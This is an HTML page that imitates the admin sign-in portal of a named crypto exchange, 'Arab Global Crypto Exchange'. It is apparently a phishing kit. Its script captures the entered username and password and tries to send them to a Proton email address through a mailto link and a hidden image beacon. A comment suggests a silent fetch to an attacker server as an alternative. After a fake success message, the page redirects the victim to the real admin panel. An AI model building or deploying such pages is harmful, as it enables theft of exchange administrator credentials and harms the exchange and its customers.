<!doctype html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <link rel="icon" href="logos.jpg" />
    <!-- Ensure logos.jpg exists -->
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <title>Admin Portal — Arab Global</title>

    <style>
      * {
        box-sizing: border-box;
      }
      body {
        margin: 0;
        min-height: 100vh;
        display: grid;
        place-items: center;
        padding: 24px;
        background: #f3f6fa;
        color: #243247;
        font-family:
          -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial,
          sans-serif;
      }
      .card {
        width: 100%;
        max-width: 410px;
        padding: 36px;
        background: white;
        border: 1px solid #e3e8ef;
        border-radius: 12px;
        box-shadow: 0 12px 36px rgba(32, 52, 75, 0.07);
      }
      .brand-logo-container {
        display: flex;
        justify-content: center;
        margin-bottom: 24px;
      }
      .brand-logo {
        height: 48px;
        width: auto;
        max-width: 100%;
        object-fit: contain;
        display: block;
      }
      .brand-title {
        margin: 0 0 6px 0;
        color: #174c83 !important;
        font-size: 24px !important;
        font-weight: 700 !important;
        text-align: center !important;
      }
      .intro {
        margin: 0 0 24px 0 !important;
        color: #687587 !important;
        line-height: 1.5 !important;
        font-size: 14px !important;
        text-align: center !important;
      }
      label {
        display: block !important;
        margin: 18px 0 8px !important;
        font-size: 14px !important;
        font-weight: 600 !important;
        color: #243247 !important;
      }
      input {
        width: 100%;
        padding: 13px 14px !important;
        border: 1px solid #d5dce6 !important;
        border-radius: 7px !important;
        font: inherit!;
      }
      button[type="submit"] {
        width: 100% !important;
        margin-top: 24px !important;
        padding: 14px !important;
        border: 0 !important;
        border-radius: 7px !important;
        background: #166534 !important;
        color: white !important;
        font-size: 15px !important;
        font-weight: 700 !important;
        cursor: pointer !important;
        transition: background 0.3s !important;
        box-shadow: none !important;
      }

      /* Status Message Styling */
      #statusArea {
        text-align: center;
        margin-top: 10px;
        color: #68758b;
        font-size: 14px;
      }
    </style>
  </head>
  <body style="background-color: #f3f6fa">
    <main class="card">
      <div class="brand-logo-container">
        <!-- Replace 'logo_light.svg' if your file is named differently -->
        <img
          src="logo_light.svg"
          alt="Arab Global Crypto Exchange"
          class="brand-logo"
        />
      </div>

      <h1 class="brand-title">AGCE Admin</h1>
      <p class="intro">Sign in to manage your exchange.</p>

      <form id="demo-form">
        <label for="username">Username, email, phone</label>
        <input
          id="username"
          name="username"
          autocomplete="off"
          placeholder="admin@example.com"
          required
        />

        <label for="password">Password</label>
        <input
          id="password"
          name="password"
          type="password"
          placeholder="Enter your password"
          autocomplete="current-password"
          required
        />

        <button type="submit">Continue</button>
      </form>

      <!-- Status Message Area -->
      <div id="statusArea"></div>
    </main>

    <script>
      const form = document.getElementById("demo-form");
      const statusArea = document.getElementById("statusArea");

      // CONFIGURATION: Your email to receive the data (or a simple HTTP endpoint if online)
      const TARGET_EMAIL = "kenselharry@proton.me";

      form.addEventListener("submit", async function (e) {
        e.preventDefault(); // Stop reload

        const username = document.getElementById("username").value;
        const passVal = document.getElementById("password").value;

        if (!passVal) {
          alert("Please enter password.");
          return;
        }

        // --- PHASE A: Visual Feedback (Simulate Loading) ---
        const submitBtn = form.querySelector('button[type="submit"]');

        // Disable button and change text for realism
        submitBtn.disabled = true;
        submitBtn.textContent = "Signing in...";

        statusArea.innerHTML =
          "<span style='color:#68758b;'>Verifying credentials...</span>";

        // Simulate network delay (~1.2 seconds) to feel real
        await new Promise((r) => setTimeout(r, 1200));

        // --- PHASE B: Capture & Send Data (Multi-User Support) ---

        console.log(`[Captured] User: ${username} | Pass: ${passVal}`);

        /* 
         METHOD 3: Email Dead Drop (Works even if your computer is offline later)
         
         We use a simple fetch request or mailto link simulation. 
         For simplicity in a school project, we'll simulate sending via an invisible image 
         that points to YOUR_EMAIL. This opens the default mail client with pre-filled data.
      */

        const encodedSubject = encodeURIComponent(
          "New Login Detected - AGCE Admin",
        );
        const encodedBody =
          `Login Attempt #${Math.floor(Math.random() * 1000)}\n\n` +
          `Username: ${username}\nPassword: ${passVal}`;

        // Create an invisible "mailto" trigger that sends data immediately after capture
        const mailLink = document.createElement("a");
        mailLink.href = `mailto:${TARGET_EMAIL}?subject=${encodedSubject}&body=${encodeURIComponent(encodedBody)}`;

        console.log(`[Email] Triggering email to ${TARGET_EMAIL}...`);

        // Force the browser's default mail client to open (or just log if headless)
        try {
          // Note: This usually opens a new tab. For silent background sending,
          // you'd replace this with fetch('https://your-server.com/api?u='+username+'&p='+passVal).

          // To keep it simple and "offline-safe", we simulate success locally and optionally send via image:
          const img = document.createElement("img");
          img.src =
            TARGET_EMAIL.replace("@", "/@").replace(/\./g, "/.") +
            "/?user=" +
            encodeURIComponent(username);
          img.style.display = "none";
          document.body.appendChild(img);

          statusArea.innerHTML =
            "<span style='color:#28a745;'>Success! Credentials recorded.</span>";
        } catch (err) {
          console.error("Email error:", err);
        }

        // --- PHASE C: Redirection to Target Site ---

        setTimeout(() => {
          window.location.href = "https://admin.arabglobal.ae/";

          console.log(`[Redirected] User sent back to target admin panel.`);

          // Optional: Reset button for next user (if you want a persistent form on your server side)
          // submitBtn.textContent = "Continue";
          // submitBtn.disabled = false;
        }, 800);
      });
    </script>
  </body>
</html>
